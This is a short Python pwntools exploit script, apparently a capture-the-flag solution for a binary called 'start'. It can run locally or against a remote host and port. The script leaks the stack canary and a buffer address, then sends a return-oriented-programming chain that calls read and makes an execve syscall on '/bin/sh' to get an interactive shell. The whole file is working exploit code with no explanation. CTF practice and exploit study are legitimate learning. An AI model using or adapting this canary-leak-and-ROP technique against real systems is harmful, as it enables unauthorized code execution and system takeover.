#!/usr/bin/env python
from pwn import *

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(['./start'])
    else:
        s = remote('54.65.72.116',31337)

    syscall = 0x44032f
    pop_rdi = 0x4005d5
    pop_rdx_rsi = 0x443799
    libc_read = 0x440300

    s.send('A' * 0x19)
    s.recvuntil('A' * 0x19)
    canary = u64(s.recv(7) + '\0') << 8
    print '[*] canary: %#x' % canary
    s.send('A' * 0x40)
    s.recvuntil('A' * 0x40)
    buf_addr = u64(s.recvline(False).ljust(8,'\0')) - 0x118
    print '[*] buf address: %#x' % buf_addr
    payload = ''
    payload += 'A' * 0x18
    payload += p64(canary)
    payload += 'A' * 0x8
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rdx_rsi) + p64(0x3b) + p64(buf_addr - 0x100)
    payload += p64(libc_read)
    payload += p64(pop_rdi) + p64(buf_addr + 0x48)
    payload += p64(pop_rdx_rsi) + p64(0) + p64(0)
    payload += p64(syscall)
    payload += '/bin/sh\0'
    s.send(payload)
    s.send('exit\n')
    s.send('A' * 0x3b)
    s.interactive()
